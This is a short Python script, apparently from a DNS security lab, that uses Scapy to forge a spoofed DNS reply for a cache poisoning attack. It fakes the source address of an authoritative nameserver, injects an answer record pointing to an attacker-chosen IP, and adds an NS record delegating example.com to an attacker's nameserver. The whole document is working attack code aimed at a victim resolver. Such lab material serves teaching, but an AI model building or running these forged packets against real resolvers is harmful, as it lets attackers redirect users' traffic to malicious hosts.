#!/usr/bin/env python3
from scapy.all import *  

# Construct the DNS header and payload
name = 'twysw.example.com'
domain = 'example.com'
ns = 'ns.attacker32.com'
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200) # 1.2.3.4 is attacker desired IP
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, 
  qdcount=1, ancount=1, nscount=1, arcount=0,
  qd=Qdsec, an=Anssec, ns=NSsec)

# Construct the IP, UDP headers, and the entire packet
# dst is the victim local dns server 10.9.0.53  
# src is nameserver IP, found via wireshark, can be:
# - 199.43.135.53 (a.iana-servers.net)
# - 199.43.133.53 (b.iana-servers.net) 
# also see https://intodns.com/example.com
udp = UDP(dport=33333, sport=53, chksum=0) 
ip = IP(dst='10.9.0.53', src='199.43.133.53') 
response = ip/udp/dns

# Save the packet to a file in binary
with open('ip_res.bin', 'wb') as f:
  f.write(bytes(response))